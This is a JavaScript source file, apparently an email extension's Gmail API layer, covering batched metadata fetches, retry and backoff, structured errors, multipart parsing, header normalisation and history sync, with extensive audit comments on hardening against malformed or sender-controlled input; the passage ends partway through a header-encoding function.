/**
 * Gmail REST layer. Lives in the service worker so the access token never
 * enters a document that renders untrusted mail HTML.
 *
 * WHY A REAL MULTIPART BATCH
 * --------------------------
 * Fetching 200 message headers one request at a time is 200 TLS round trips
 * and 200 chances to hit a per-request quota. Gmail's /batch endpoint takes up
 * to 100 sub-requests in ONE HTTP request. The old version used it too; this
 * is the one thing it got right about the network layer and it is carried over.
 *
 * We ask for `format=metadata` with an explicit header allow-list. That is a
 * fraction of the bytes of `format=full` and it is everything the list view
 * needs. Bodies are fetched lazily, one message at a time, only when the user
 * actually opens something.
 */

/*
 * forceRenew is imported BY NAME (bug-hunt #2): this file once wrote
 * `auth.forceRenew()` with no `auth` binding at all -- a ReferenceError that
 * could never surface because the 401 branch that called it was unreachable.
 * Dead code hiding a crash: the import is the test that proves the arm is
 * wired.
 */
import { getToken, forceRenew } from './auth.js';
/* AUD-Q1 (audit 2026-08-15): the request/retry counters. diag.js is pure
   module state — importing it here adds no chrome.* touch to this layer,
   and the app-context copy simply never persists (its doctrine, declared). */
import { bump } from './diag.js';

const BASE = 'https://gmail.googleapis.com/gmail/v1/users/me';
const BATCH_URL = 'https://gmail.googleapis.com/batch/gmail/v1';

/** Headers we need for the list view. Anything else is wasted bandwidth. */
// V2 P0-3: the canonical model promises to/cc/list-headers; the wire layer
// must actually fetch them or audienceOf sees every record as direct.
const META_HEADERS = ['From', 'Subject', 'Date', 'List-Unsubscribe', 'To', 'Cc', 'List-Id', 'Mailing-List'];

/** Gmail's own limit. Do not raise it; the endpoint rejects >100. */
export const BATCH_SIZE = 100;

async function authHeaders(extra = {}) {
  const token = await getToken();
  return { Authorization: `Bearer ${token}`, ...extra };
}

/**
 * Statuses worth trying again.
 *
 * 429 is the important one and it is NOT an error condition here: Gmail
 * rate-limits per user, and a 100-message batch is a burst by definition, so a
 * healthy sync of a busy inbox produces these routinely. Treating one as fatal
 * showed the user `Gmail 429 /messages` and stopped the sync, and their only
 * recourse was Refresh, which reissued the same burst.
 *
 * 403 is deliberately NOT here. Gmail returns 403 both for `rateLimitExceeded`
 * (retryable) and for insufficient scope (never retryable), and retrying a
 * permissions failure three times just delays a clear error. It is
 * distinguished by body text below.
 */
const RETRYABLE = new Set([429, 500, 502, 503, 504]);

/** Cap on attempts, including the first. Keep small: the user is waiting. */
const MAX_ATTEMPTS = 3;

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

/**
 * How long to wait before attempt N (1-indexed).
 *
 * Honours `Retry-After` when Google sends it -- guessing when we have been told
 * is how you get rate-limited harder. Otherwise exponential with jitter; the
 * jitter matters because several parallel batch requests will otherwise all
 * wake at the same instant and re-collide.
 */
function backoffMs(attempt, res) {
  const header = res?.headers?.get?.('Retry-After');
  if (header) {
    const secs = Number(header);
    if (Number.isFinite(secs)) return Math.min(secs * 1000, 30_000);
    const when = Date.parse(header);
    if (!Number.isNaN(when)) return Math.max(0, Math.min(when - Date.now(), 30_000));
  }
  const base = 500 * 2 ** (attempt - 1); // 500, 1000, 2000
  return base + Math.random() * 250;
}

/** True for a 403 that is a quota problem rather than a permissions problem. */
function isQuota403(body) {
  return /rateLimitExceeded|userRateLimitExceeded|quotaExceeded/i.test(body);
}

/**
 * Fetch with bounded retry. Shared by `api()` and the batch endpoint so both
 * behave identically under load.
 *
 * Returns the successful Response. Throws with the last status on give-up.
 */
/*
 * EVERY FETCH CARRIES ITS OWN ABORT BUDGET (cross-audit H2). A connection
 * that accepts but never answers used to hang the fallback path forever --
 * `fetch` without a signal neither rejects nor times out. The abort turns a
 * blackhole proxy into an ordinary retryable network error.
 */
const FETCH_BUDGET_MS = 30000;
function unknownOutcome(label, cause) {
  /** @type {Error & {code?:string}} */
  const err = new Error(`Delivery outcome unknown for ${label}: ${cause}`);
  err.code = 'OUTCOME_UNKNOWN';
  return err;
}

/**
 * THE STATUS IS A NUMBER, NOT A SUBSTRING (audit EXT2-C2/EXT2-H4).
 *
 * Every transport error used to be a bare `Error` whose only machine-readable
 * content was its own message text, and callers matched that text:
 *
 *   gmail.js  `if (String(err).includes('404')) return { tooOld: true }`
 *   main.js   `else if (/401|invalid_grant/i.test(msg))  -> sign the user out`
 *
 * Both are reachable by accident, because the message embeds the request
 * PATH, and Gmail paths carry ids:
 *
 *   "Gmail 503 /history?startHistoryId=4045678&maxResults=500 ..."
 *      -> includes('404') === true -> the local mailbox is thrown away
 *   "Gmail 500 /messages/18f401ab77cd0e12/modify ..."
 *      -> /401/ matches the MESSAGE ID -> the user is signed out
 *
 * Both reproduced before this change. The fix is to carry the status as a
 * field, so a decision about "what kind of failure was this" never has to
 * read prose. The message text is unchanged — it is for humans and for the
 * existing tests that pin it; `status`/`code` are for control flow.
 *
 * `kind` is the coarse class every layer actually branches on, so a caller
 * never has to memorise status numbers either.
 */
export function apiError(status, label, body = '') {
  /** @type {Error & {status?:number, code?:string, kind?:string}} */
  const err = new Error(`Gmail ${status} ${label} ${String(body).slice(0, 200)}`);
  err.status = status;
  err.code = `GMAIL_${status}`;
  err.kind = status === 401 ? 'auth'
    : status === 403 ? 'permission'
      : status === 404 || status === 410 ? 'gone'
        : status === 429 ? 'rate'
          : status >= 500 ? 'server'
            : 'client';
  return err;
}

/** A transport-level failure with no HTTP status at all (offline, DNS, abort). */
export function networkError(label, cause) {
  /** @type {Error & {status?:number, code?:string, kind?:string}} */
  const err = new Error(`Network error on ${label}: ${cause}`);
  err.status = 0;
  err.code = 'NETWORK';
  err.kind = 'network';
  return err;
}

async function fetchRetrying(url, init, label, { retry = true } = {}) {
  let lastErr;
  const attempts = retry ? MAX_ATTEMPTS : 1;
  for (let attempt = 1; attempt <= attempts; attempt++) {
    bump('requests');
    if (attempt > 1) bump('retries');
    let res;
    try {
      // AbortSignal.timeout: the hang budget without a setTimeout the test
      // timer-stub could collapse (and Chrome 116+ / Node both support it).
      res = await fetch(url, { ...init, signal: AbortSignal.timeout(FETCH_BUDGET_MS) });
    } catch (err) {
      // Network-level failure (offline, DNS, connection reset, our own
      // abort). Retryable.
      if (!retry) throw unknownOutcome(label, err.message);
      lastErr = networkError(label, err.message);
      if (attempt === attempts) break;
      await sleep(backoffMs(attempt, null));
      continue;
    }

    if (res.ok) return res;

    /*
     * 401 is the caller's business, not a retry failure (bug-hunt #2):
     * api() owns the renew-once path, and it can only own it if the 401
     * RESPONSE reaches it. Throwing here made that branch dead code -- the
     * V2 P1-10 fix never fired.
     */
    if (res.status === 401) return res;

    const body = await res.text().catch(() => '');
    const retryable = RETRYABLE.has(res.status) || (res.status === 403 && isQuota403(body));
    lastErr = apiError(res.status, label, body);

    if (!retry && res.status >= 500) throw unknownOutcome(label, `Gmail ${res.status}`);
    if (!retryable || attempt === attempts) break;
    await sleep(backoffMs(attempt, res));
  }
  throw lastErr;
}

/** Single authenticated call. `path` is relative to /users/me. */
export async function api(path, init = {}) {
  // `retry` is transport policy, not a Fetch option. Non-idempotent callers
  // disable it so a lost acknowledgement becomes OUTCOME_UNKNOWN instead of a
  // second external side effect.
  const { retry = true, ...rest } = init;
  /** @type {any} */
  const fetchInit = rest;
  const headers = await authHeaders(fetchInit.headers || {});
  const res = await fetchRetrying(
    `${BASE}${path}`, { ...fetchInit, headers }, path, { retry }
  );
  if (res.status === 401) {
    // Separated auth states (V2 P1-10): renew once and retry; the renewal's
    // own error taxonomy (revoked vs transient) propagates untouched.
    await forceRenew();
    const h2 = await authHeaders(fetchInit.headers || {});
    const r2 = await fetchRetrying(
      `${BASE}${path}`, { ...fetchInit, headers: h2 }, path, { retry }
    );
    if (r2.status === 401) {
      // A fresh token that is ALSO rejected is not data -- it is the
      // canonical revoked state. Returning the error body as a value used to
      // let callers read `.messages || []` on it and paint an empty inbox.
      throw new Error('AUTH_REVOKED: Gmail rejected a freshly renewed token');
    }
    if (r2.status === 204) return null;
    return r2.json();
  }
  if (res.status === 204) return null;
  return res.json();
}

/**
 * One page of message ids.
 * Returns { ids, nextPageToken }.
 */
export async function listIds({ q = '', labelIds = ['INBOX'], max = 100, pageToken = '' } = {}) {
  const params = new URLSearchParams();
  params.set('maxResults', String(Math.min(max, 500)));
  for (const l of labelIds) params.append('labelIds', l);
  if (q) params.set('q', q);
  if (pageToken) params.set('pageToken', pageToken);
  const data = await api(`/messages?${params}`);
  return {
    ids: (data.messages || []).map((m) => m.id),
    nextPageToken: data.nextPageToken || '',
  };
}

/**
 * A batch result: the records that arrived, plus the ids that did not.
 *
 * `missingIds` is non-enumerable at runtime (the array shape is unchanged for
 * every existing caller) but it IS part of the contract, so it is typed here
 * rather than left for a caller to discover -- the whole point of R3-03 is
 * that a shortfall must be impossible to miss.
 *
 * @typedef {Array<any> & {missingIds?: string[]}} BatchResult
 */

/**
 * Metadata for up to BATCH_SIZE ids in ONE request.
 * Returns an array of normalised message records (see `normalise`).
 * Sub-requests that fail are dropped, not thrown -- one dead message must not
 * kill a sync of a hundred good ones -- but the ids they lost are reported on
 * `missingIds` so the caller can refuse to advance a durable cursor (R3-03).
 *
 * @param {string[]} ids
 * @returns {Promise<BatchResult>}
 */
export async function batchMetadata(ids) {
  if (ids.length === 0) return [];
  if (ids.length > BATCH_SIZE) throw new Error(`batchMetadata: ${ids.length} > ${BATCH_SIZE}`);

  const boundary = `bmm_${Math.random().toString(36).slice(2)}_${Date.now()}`;
  const qs = new URLSearchParams();
  qs.set('format', 'metadata');
  for (const h of META_HEADERS) qs.append('metadataHeaders', h);

  const body =
    ids
      .map(
        (id, i) =>
          `--${boundary}\r\n` +
          `Content-Type: application/http\r\n` +
          `Content-ID: <bmm-${i}>\r\n\r\n` +
          `GET /gmail/v1/users/me/messages/${encodeURIComponent(id)}?${qs}\r\n\r\n`
      )
      .join('') + `--${boundary}--\r\n`;

  // Same retry policy as api(). The batch endpoint is the single most likely
  // request to be rate-limited, because it is 100 sub-requests at once.
  const makeInit = async () => ({
    method: 'POST',
    headers: await authHeaders({ 'Content-Type': `multipart/mixed; boundary=${boundary}` }),
    body,
  });
  let res = await fetchRetrying(BATCH_URL, await makeInit(), '/batch');
  // fetchRetrying deliberately returns 401 so the owner can renew once. The
  // batch path used to parse that auth body as multipart and misreport an
  // empty batch instead.
  if (res.status === 401) {
    await forceRenew();
    res = await fetchRetrying(BATCH_URL, await makeInit(), '/batch');
    if (res.status === 401) throw new Error('AUTH_REVOKED: Gmail batch rejected a fresh token');
  }
  const text = await res.text();
  /* AUD-Q2 (audit 2026-08-15): parseBatch answers whatever ids the WIRE
     claims, and identity in a batch response is carried in-band — a
     confused or hostile peer could slip a part whose id we never asked
     for into the canonical store. The fix is a whitelist, applied BEFORE
     normalise so a phantom never even becomes a record: only ids this
     exact request asked for may proceed. Valid traffic is identical
     (Google echoes the id requested, by definition of the sub-URL). */
  const requested = new Set(ids);
  /** @type {BatchResult} */
  const out = parseBatch(text)
    .filter((raw) => raw && requested.has(raw.id))
    .map(normalise)
    .filter(Boolean);
  // A batch whose sub-requests ALL died must read as a FAILURE, never as
  // "zero messages" (V2 P2-20) -- an auth hiccup must not look like an
  // empty inbox. The same law covers the all-phantom answer AUD-Q2 adds.
  if (ids.length > 0 && out.length === 0) {
    throw new Error('batch metadata returned nothing for ' + ids.length + ' ids');
  }
  /*
   * PARTIAL SUCCESS IS NOW SAYABLE (audit R3-03, HIGH).
   *
   * parseBatch drops any sub-part whose status line is not 2xx, and the
   * guard above catches only the ALL-fail case. So 40 failed sub-requests
   * out of 100 returned 60 messages and looked exactly like a healthy batch
   * of 60 -- and syncDelta then advanced the history cursor past the 40 that
   * were never fetched. Because the cursor is the only record of what has
   * been seen, those messages were unrecoverable until it expired (~a week).
   * That is the same class the syncPage comment already warns about
   * ("too-new loses mail irrecoverably"), arriving through a different door.
   *
   * The array shape is preserved -- every existing caller keeps working and
   * every existing test keeps passing -- and the shortfall rides along as a
   * non-enumerable property so it cannot leak into JSON, deep-equality or a
   * spread. Callers that advance a durable cursor MUST read it; syncDelta
   * does, and a test pins that it does.
   */
  const missing = ids.filter((id) => !out.some((m) => m.id === id));
  Object.defineProperty(out, 'missingIds', {
    value: missing, enumerable: false, writable: false, configurable: true,
  });
  if (missing.length) bump('batchShortfall', missing.length);
  return out;
}

/**
 * Parse a multipart/mixed batch response into JSON objects.
 *
 * Deliberately tolerant: Google has changed the exact header casing and line
 * endings in this response before, and a strict parser silently returns an
 * empty inbox when that happens. We find the JSON payload of each part by
 * looking for the last blank-line separator inside the part.
 */
export function parseBatch(text) {
  const m = text.match(/--([^\s-][^\r\n]*?)(?:\r?\n)/);
  if (!m) return [];
  const boundary = m[1].replace(/--$/, '');
  const out = [];
  /*
   * SPLIT ON THE DELIMITER AT A LINE START, not on the bare token
   * (audit R3-14). MIME boundaries are defined as a CRLF followed by "--";
   * splitting on the token alone also cuts inside a BODY that happens to
   * contain it, and the two halves then parse as neither. The metadata
   * headers this request asks for (Subject, From) are sender-controlled
   * strings that land in that JSON, so the input is attacker-influenced
   * even though the random per-request boundary makes a deliberate hit
   * impractical. Anchoring costs nothing and removes the class.
   *
   * The leading (?:^|\r?\n) keeps the first delimiter matchable, and the
   * parser stays deliberately tolerant about what follows it.
   */
  const delimiter = new RegExp(`(?:^|\\r?\\n)--${boundary.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}`);
  for (const raw of text.split(delimiter)) {
    const part = raw.trim();
    if (!part || part === '--') continue;
    /*
     * SPLIT THE ENVELOPE OFF, DO NOT SHRED THE BODY (audit EXT2-M1).
     *
     * This used to `split(/\r?\n\r?\n/)` the WHOLE part and rejoin
     * `chunks.slice(2)` with a hardcoded '\n\n'. Two defects fell out of it:
     *
     *   1. A JSON body containing a blank line was rejoined with '\n\n'
     *      regardless of the CRLF the wire actually used, and any part whose
     *      body began after an extra blank line lost a chunk to the envelope
     *      count. Reproduced: a part whose snippet contained "a\n\nb" parsed
     *      to NOTHING and vanished from the batch with no error — a mixed
     *      batch silently lost that message.
     *   2. `chunks.length < 3` rejected a well-formed part that simply had no
     *      MIME preamble.
     *
     * Splitting exactly twice — once for the part headers, once for the HTTP
     * headers — leaves the body byte-identical to the wire, which is what a
     * JSON parser needs. Gmail's snippets are sender-controlled, so a blank
     * line in one is ordinary traffic, not an exotic case.
     */
    const afterPartHeaders = splitOnce(part);
    if (afterPartHeaders === null) continue;
    const httpSection = splitOnce(afterPartHeaders);
    if (httpSection === null) continue;
    const status = afterPartHeaders.split(/\r?\n/)[0] || '';
    if (!/\s2\d\d\s/.test(` ${status} `)) continue; // drop failed sub-requests
    const bodyText = httpSection.trim();
    if (!bodyText.startsWith('{')) continue;
    try {
      out.push(JSON.parse(bodyText));
    } catch {
      /* one malformed part must not poison the batch */
    }
  }
  return out;
}

/**
 * Everything after the FIRST blank line, or null when there is none.
 *
 * The blank line is MIME's one unambiguous header/body separator, and taking
 * only the first occurrence is what keeps a body containing blank lines
 * intact (EXT2-M1). Accepts either line ending, because Google has changed
 * that in this response before.
 */
function splitOnce(text) {
  const at = text.search(/\r?\n\r?\n/);
  if (at === -1) return null;
  const sep = text.slice(at).match(/^\r?\n\r?\n/)[0];
  return text.slice(at + sep.length);
}

/**
 * Gmail's wire format -> our flat record.
 *
 * Flat on purpose. The old version kept Gmail's nested payload/headers array
 * in the store, which meant every render walked an array of ~20 header objects
 * per message just to find the subject.
 */
/**
 * Attachment presence from the payload, without fetching bodies.
 * Inline images (contentId + inline disposition) do NOT count -- V2 stress
 * verified hasAttachment was always falsy, which made has:attachment dead.
 */
function payloadHasAttachment(payload) {
  const stack = payload?.parts ? [...payload.parts] : [];
  while (stack.length) {
    const part = stack.pop();
    if (part?.parts?.length) { stack.push(...part.parts); continue; }
    if (part?.filename && part?.body?.attachmentId &&
        String(part.body.disposition || '').toLowerCase() !== 'inline') return true;
  }
  return false;
}

/**
 * Collapse internalDate + the Date: header to ONE finite epoch, or 0.
 *
 * (fuzz sweep #19, 2026-08-14). The old cascade `Number(x) || Date.parse(y)
 * || 0` read as "fall back on garbage", but a wire value of '1e999' parses
 * to Infinity -- TRUTHY -- so the fallback never ran and an infinite instant
 * crossed the trust boundary into the canonical store: the row sorted above
 * every message forever, persisted across restarts, and every consumer had
 * to learn to abstain (fuzz #2's relativeLabel, #6's fullDate, #13's
 * deadline anchor). Non-finite dies HERE now, at the one place data enters:
 * any finite nonzero number is honoured exactly as before (pre-1970 mail is
 * negative and stays negative); 0, NaN and ±Infinity fall through to the
 * Date header, which is itself finite-or-floor. Exactly the old falsy
 * semantics, minus the non-finite ones.
 *
 * Shared with mime.js's extractBody, which made the same promise with the
 * same broken cascade on the GET_BODY path.
 */
/**
 * Roughly the year 2200. Any timestamp beyond this is a corrupt or hostile
 * value, not a scheduled message: it would pin the row to the top of the
 * list permanently (round 8, M-5).
 */
const MAX_PLAUSIBLE_EPOCH_MS = 7258118400000;

export function toEpoch(internalDate, dateHeader) {
  const ms = Number(internalDate);
  /*
   * R3-13, RESOLVED AS "WORKING AS DESIGNED" — recorded because the audit
   * called it a defect and the audit was wrong.
   *
   * The finding was that '-5' passes through as a pre-1970 instant. It
   * does, and that is DELIBERATE: pre-1970 mail is negative and stays
   * negative (see the contract above, and the fuzz reproducer pinning
   * '-31536000000'). Tightening this to `ms > 0` would silently relocate
   * genuinely old archived mail to whatever its Date header claims, which
   * is the sender-controlled value this function exists to distrust.
   *
   * A nonsensical '-5' is indistinguishable from a legitimately ancient
   * message at this layer, and the harm of the two mistakes is not
   * symmetric: mis-sorting one absurd record costs a row in the wrong
   * place, while rewriting every pre-1970 date costs real mail its real
   * timestamp. The boundary that matters — non-finite — is already closed.
   */
  /*
   * A CEILING, NOT JUST A FINITENESS CHECK (round 8, M-5).
   *
   * Non-finite was already refused (fuzz #19), but any finite number passed:
   * toEpoch('99999999999999') yielded the year 5138, which sorts above
   * everything for ever, survives cache round-trips and cannot be dismissed.
   * internalDate is server-supplied so this is not attacker-controlled
   * today, but the Date: HEADER fallback below is, and it shares this path.
   *
   * The bound is generous on purpose -- a legitimately post-dated message is
   * a real thing, an eleventh-century-hence one is not. Below the floor the
   * value is refused rather than clamped: silently rewriting a timestamp is
   * how a message ends up at a position nothing explains.
   */
  if (ms && Number.isFinite(ms) && ms < MAX_PLAUSIBLE_EPOCH_MS) return ms;
  // Date.parse returns NaN or a finite number -- never a non-finite one --
  // so the `|| 0` floor is the whole second half of the contract. The
  // ceiling applies here too: this half IS attacker-controlled.
  const parsed = Date.parse(dateHeader) || 0;
  return parsed < MAX_PLAUSIBLE_EPOCH_MS ? parsed : 0;
}

export function normalise(g) {
  if (!g?.id) return null;

  /*
   * THIS IS THE TRUST BOUNDARY for everything that comes off the network.
   *
   * It used to copy header values through verbatim, which broke two ways:
   *
   *   1. A header with no `name`, or a null entry in the array, threw here
   *      and killed the whole page of messages -- one malformed header meant
   *      an empty inbox.
   *   2. A non-string `value` was passed straight through, so `subject` could
   *      be a number and `from` an object. Downstream, `classify()` calls
   *      `.toLowerCase()` and `buildReply()` calls `.replace()`, both of which
   *      throw on a non-string. Fuzzing found both.
   *
   * Coercing HERE rather than defending in every consumer is the correct
   * layer: there is one place data enters, and dozens that read it. Every
   * field below is guaranteed to be the type its JSDoc claims.
   */
  const h = headerMap(g.payload?.headers);
  const labels = Array.isArray(g.labelIds) ? g.labelIds : [];
  return {
    id: str(g.id),
    threadId: str(g.threadId) || str(g.id),
    from: h.from || '',
    subject: h.subject || '(no subject)',
    snippet: decodeEntities(str(g.snippet)),
    // internalDate is ms-since-epoch as a STRING, and it is authoritative.
    // The Date: header is attacker-controlled and is routinely wrong.
    // The fallback keeps it anyway (bug-hunt #41): no-internalDate records
    // are rarer than wrong Date headers, and a 1970 date would sink the
    // message below everything and hide it -- worse than a wrong position.
    date: toEpoch(g.internalDate, h.date),
    unread: labels.includes('UNREAD'),
    starred: labels.includes('STARRED'),
    important: labels.includes('IMPORTANT'),
    // V2 P0-3: recipient + list headers ride along so the canonical shaper
    // and audienceOf see real data on every sync path.
    to: h.to || '',
    cc: h.cc || '',
    headers: h,
    hasAttachment: payloadHasAttachment(g.payload),
    labels,
  };
}

/**
 * Coerce any header/field value to a string.
 *
 * Gmail's API is well behaved, but "well behaved" is not a guarantee we can
 * enforce, and a single unexpected type used to crash the classifier for an
 * entire page of mail. Objects and arrays become '' rather than
 * "[object Object]", which would otherwise become searchable text.
 */
/**
 * Fold a Gmail header array into a lowercase-keyed object.
 *
 * Exported because THREE separate places parsed header arrays by hand
 * (`normalise` here, and `extractBody`'s message and part loops in
 * index.js), and all three used the same `for (const { name, value } of ...)`
 * shape that throws on a header with no `name` or a null entry. Fuzzing found
 * the crash independently in each.
 *
 * One malformed header used to cost an entire page of mail in `normalise`,
 * and a single unreadable message in `extractBody`. Both are now impossible
 * because there is one parser rather than three copies of an assumption.
 */
export function headerMap(headers) {
  const out = Object.create(null);
  if (!Array.isArray(headers)) return out;
  for (const entry of headers) {
    const name = entry?.name;
    if (typeof name !== 'string') continue;
    /*
     * FIRST WINS, per RFC 5322 §3.6 (round 8, M-4).
     *
     * This kept the LAST value, and a message with two `Subject:` or two
     * `From:` headers is a classic spoofing shape: the receiving client
     * shows one value while a filter or a scanner matched the other.
     * Last-wins hands the attacker whichever one the user reads. Conforming
     * senders emit these once, so first-wins costs honest mail nothing.
     */
    const key = name.toLowerCase();
    if (key in out) continue;
    /* Decoded at the door (round 8, H-2): every consumer — normalise, the
       search index, extractBody's reply fields — reads the human text
       rather than the wire encoding. */
    out[key] = decodeEncodedWords(entry.value);
  }
  return out;
}

/**
 * Decode RFC 2047 encoded-words: `=?charset?B|Q?text?=`.
 *
 * WHY THIS EXISTS (round 8, H-2). This codebase ENCODES headers when sending
 * (`encodeHeader`) and had no decoder for the receive path. Gmail's API
 * normally pre-decodes, but not for every header on every message, and when
 * it does not the raw encoded-word reaches the store. Measured on
 * `=?UTF-8?B?SsO2cmc=?= <j@x.z>`:
 *
 *   - the list rendered the literal `=?UTF-8?B?SsO2cmc=?=` as the sender
 *   - `search('jörg')` returned nothing — the real name was unfindable
 *   - the index gained `utf-8`, `c3`, `a9`, `sso2cmc` as permanent tokens,
 *     so unrelated queries matched the encoding's own fragments
 *
 * Decoding HERE, in headerMap, is deliberate: it is the single door every
 * header value already passes through on its way in, so display, search and
 * the canonical record are fixed by one change rather than three.
 *
 * TOTALITY, like every other coercion at this boundary: a malformed word,
 * an unknown charset or a bad base64 payload yields the ORIGINAL text
 * unchanged. A header that fails to decode must stay readable-ish, never
 * become empty — losing the subject is worse than showing it awkwardly.
 */
export function decodeEncodedWords(value) {
  const v = str(value);
  if (!v.includes('=?')) return v; // the overwhelmingly common case, untouched

  /* Adjacent encoded-words separated only by whitespace are one logical run
     (RFC 2047 §6.2), so the space between them is dropped rather than kept. */
  return v.replace(
    /=\?([A-Za-z0-9_-]+)(?:\*[A-Za-z0-9-]+)?\?([BbQq])\?([^?]*)\?=(\s+)(?==\?)/g,
    (_m, cs, enc, txt) => `=?${cs}?${enc}?${txt}?=`
  ).replace(
    /=\?([A-Za-z0-9_-]+)(?:\*[A-Za-z0-9-]+)?\?([BbQq])\?([^?]*)\?=/g,
    (whole, charset, encoding, text) => {
      try {
        let bytes;
        if (encoding.toLowerCase() === 'b') {
          const bin = atob(text.replace(/\s+/g, ''));
          bytes = Uint8Array.from(bin, (c) => c.charCodeAt(0));
        } else {
          /* Quoted-printable, RFC 2047 flavour: '_' is a space, and only
             '=XX' is an escape. */
          const qp = text.replace(/_/g, ' ');
          const out = [];
          for (let i = 0; i < qp.length; i++) {
            if (qp[i] === '=' && /^[0-9A-Fa-f]{2}$/.test(qp.slice(i + 1, i + 3))) {
              out.push(parseInt(qp.slice(i + 1, i + 3), 16));
              i += 2;
            } else {
              out.push(qp.charCodeAt(i) & 0xff);
            }
          }
          bytes = Uint8Array.from(out);
        }
        /* `fatal: true` so a mislabelled charset throws to the catch and
           keeps the original, rather than silently emitting U+FFFD soup. */
        return new TextDecoder(charset, { fatal: true }).decode(bytes);
      } catch {
        return whole; // undecodable: the raw word beats an empty header
      }
    }
  );
}

function str(v) {
  if (typeof v === 'string') return v;
  if (v === null || v === undefined) return '';
  if (typeof v === 'number' || typeof v === 'boolean') return String(v);
  return '';
}

function decodeEntities(s) {
  // &amp; LAST (bug-hunt #9): decoding it first turns a literal "&amp;lt;"
  // into "&lt;" and then into "<" -- one decode pass must mean one decode.
  return s
    .replace(/&lt;/g, '<')
    .replace(/&gt;/g, '>')
    .replace(/&quot;/g, '"')
    .replace(/&#39;/g, "'")
    .replace(/&#x27;/gi, "'")
    .replace(/&apos;/g, "'")
    .replace(/&nbsp;/g, ' ')
    .replace(/&amp;/g, '&');
}

/** Full body for one message, fetched only when the user opens it. */
export async function getFull(id) {
  return api(`/messages/${encodeURIComponent(id)}?format=full`);
}

/** Add/remove labels. Used for read, star, archive. */
export async function modify(id, addLabelIds = [], removeLabelIds = []) {
  return api(`/messages/${encodeURIComponent(id)}/modify`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ addLabelIds, removeLabelIds }),
  });
}

/** Bulk modify -- one request for up to 1000 ids. */
export async function batchModify(ids, addLabelIds = [], removeLabelIds = []) {
  if (!ids.length) return null;
  await api('/messages/batchModify', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ ids, addLabelIds, removeLabelIds }),
  });
  return { ok: true };
}

export async function trash(id) {
  return api(`/messages/${encodeURIComponent(id)}/trash`, { method: 'POST' });
}

export async function profile() {
  return api('/profile');
}

/**
 * Delta sync. Returns { changes, historyId } or { tooOld: true } when the
 * stored historyId has expired (Gmail keeps ~1 week) and a full resync is
 * required. Callers must handle `tooOld`; the old version did not, which is
 * why it silently stopped updating after a long absence.
 *
 * PAGINATION IS NOT OPTIONAL HERE.
 * The response's `historyId` is the mailbox's CURRENT id, not the id of the
 * last record on this page. So if we read page 1 and then store that value, we
 * have advanced the cursor past pages 2..n without ever reading them, and
 * those changes are unrecoverable. Either we drain every page, or we do not
 * move the cursor at all.
 */
const MAX_HISTORY_PAGES = 10; // 10 * 500 = 5000 records; past that, resync is cheaper

export async function history(startHistoryId) {
  const changes = [];
  let pageToken = '';
  let historyId = null;

  for (let page = 0; page < MAX_HISTORY_PAGES; page++) {
    const params = new URLSearchParams({
      startHistoryId: String(startHistoryId),
      maxResults: '500',
    });
    for (const t of ['messageAdded', 'messageDeleted', 'labelAdded', 'labelRemoved']) {
      params.append('historyTypes', t);
    }
    if (pageToken) params.set('pageToken', pageToken);

    let data;
    try {
      data = await api(`/history?${params}`);
    } catch (err) {
      // 404 = the cursor is older than Gmail's retention window.
      /*
       * THE CURSOR IS EXPIRED ONLY IF GMAIL SAID 404 (audit EXT2-C2).
       *
       * This read `String(err).includes('404')`, and the error text contains
       * the request path — which contains `startHistoryId=<digits>`. A
       * transient 503 on a cursor whose digits happen to contain "404" took
       * the DESTRUCTIVE branch: `{tooOld:true}` makes syncDelta answer
       * `resync`, which clears the store, clears the cache and refetches from
       * zero. Reproduced with
       *   "Gmail 503 /history?startHistoryId=4045678&maxResults=500".
       *
       * A 410 Gone is the same class as 404 here (the range is unavailable),
       * so it is named explicitly rather than left to fall through to the
       * rethrow, which would surface as a generic sync error.
       *
       * Anything else — 5xx, network, rate limit — RETHROWS. The caller keeps
       * its cursor and its data, and the next refresh replays an idempotent
       * delta. Losing a sync is recoverable; throwing away the mailbox on a
       * blip is not.
       */
      const status = /** @type {any} */ (err)?.status;
      if (status === 404 || status === 410) return { tooOld: true };
      throw err;
    }

    if (data.history) changes.push(...data.history);
    historyId = data.historyId || historyId;
    pageToken = data.nextPageToken || '';
    if (!pageToken) return { changes, historyId };
  }

  /*
   * Still paging after MAX_HISTORY_PAGES. Advancing the cursor now would skip
   * whatever is left, so a resync is still the right answer -- but it is NOT
   * the same event as an expired cursor (audit R3-07). Expiry means "you were
   * away too long"; this means "too much changed", which is operationally
   * normal (a busy week, a bulk label reorganisation) and previously
   * indistinguishable in every log and metric. `exhausted` names it, and the
   * counter makes a repeated resync loop visible instead of mysterious.
   */
  bump('historyExhausted');
  return { tooOld: true, exhausted: true };
}


// ============================================================================
// COMPOSE
// ============================================================================

/**
 * RFC 2047 encoded-word, for header values containing non-ASCII.
 *
 * Subject lines carrying a rupee sign or a name with a diacritic are common in
 * BITS mail, and a raw 8-bit byte in a header is a protocol violation that
 * Gmail rejects outright. Base64 is used rather than quoted-printable because
 * it cannot produce a line that needs folding for a realistic subject.
 */
function encodeHeader(value) {
  const s = String(value ?? '');
  // eslint-disable-next-line no-control-regex
  if (/^[\x20-\x7E]*$/.test(s)) return s; // pure ASCII: leave it readable

  /*
   * FOLDED INTO ≤75-OCTET WORDS (round 8, H-3).
   *
   * This function's comment used to claim base64 "cannot produce a line that
   * needs folding for a realistic subject". Measured: a 400-character
   * accented subject produced a Subject line of 1089 octets against RFC
   * 2822's 998 limit, with no continuation lines at all. 400 characters is
   * unusual but entirely legal, and a forwarded thread carrying several
   * Re:/Fwd: prefixes in a non-Latin script reaches it. Strict MTAs reject or
   * truncate over-long header lines, so the send fails — or worse, silently
   * arrives mangled — and the outbox reports something the user cannot act on.
   *
   * RFC 2047 §2 caps an encoded-word at 75 characters INCLUDING the
   * `=?UTF-8?B?` and `?=` wrapper, and §5 allows a long value to be split
   * into several words joined by CRLF + a space. So: chunk the BYTES (never
   * mid-character — a split multi-byte sequence decodes to U+FFFD), base64
   * each chunk separately, and join with the folding whitespace.
   *
   * 45 input bytes -> 60 base64 chars + 12 wrapper = 72, comfortably inside
   * 75 with room for the leading space a continuation line carries.
   */
  const bytes = new TextEncoder().encode(s);
  const WRAP = 45;

  const words = [];
  let i = 0;
  while (i < bytes.length) {
    let end = Math.min(i + WRAP, bytes.length);
